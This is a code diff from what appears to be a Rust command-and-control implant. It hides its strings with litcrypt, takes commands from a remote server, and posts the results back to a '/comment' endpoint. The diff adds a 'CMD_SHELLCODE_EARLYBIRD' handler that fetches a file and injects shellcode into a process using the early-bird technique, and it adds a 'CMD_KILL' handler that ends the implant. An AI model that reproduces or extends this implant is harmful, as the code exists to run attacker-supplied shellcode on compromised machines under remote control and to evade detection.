@@ -2,7 +2,7 @@
 // For requests, alwaus blocking never async
 use reqwest::blocking::ClientBuilder;
 
-use litcrypt::{use_litcrypt, lc};
+use litcrypt::{lc, use_litcrypt};
 use_litcrypt!();
 
 mod commands;
@@ -117,6 +117,20 @@ fn process_command(
                 mem_perms,
             );
         }
+        "CMD_SHELLCODE_EARLYBIRD" => {
+            let file_name = cmd_vec[2];
+            let mem_perms = cmd_vec[3];
+            return commands::command::shellcode_earlybird(
+                base_url,
+                cookie_header,
+                file_name,
+                mem_perms,
+            );
+        }
+        "CMD_KILL" => {
+            let kill_id = cmd_vec[2];
+            return commands::command::kill(kill_id);
+        }
         _ => "".to_string(),
     };
 
@@ -130,8 +144,11 @@ fn send_response(
     cmd_output: &str,
     cmd_str: &String,
 ) {
+    // Create a vec out of the command string
+    let cmd_vec = cmd_str.split(":::").collect::<Vec<&str>>();
+
     // Pull out the ID
-    let cmd_id = cmd_str.split(":::").collect::<Vec<&str>>()[0];
+    let cmd_id = cmd_vec[0];
 
     // Send the response to the server
     let response_url = base_url.to_owned() + "/comment";
@@ -152,6 +169,11 @@ fn send_response(
         .body(req_body.to_owned())
         .send()
         .unwrap();
+
+    // Check to see if the command was a CMD_KILL, if so, exit out of the process
+    if cmd_vec[1] == lc!("CMD_KILL") {
+        std::process::exit(0);
+    }
 }
 
 fn main() {
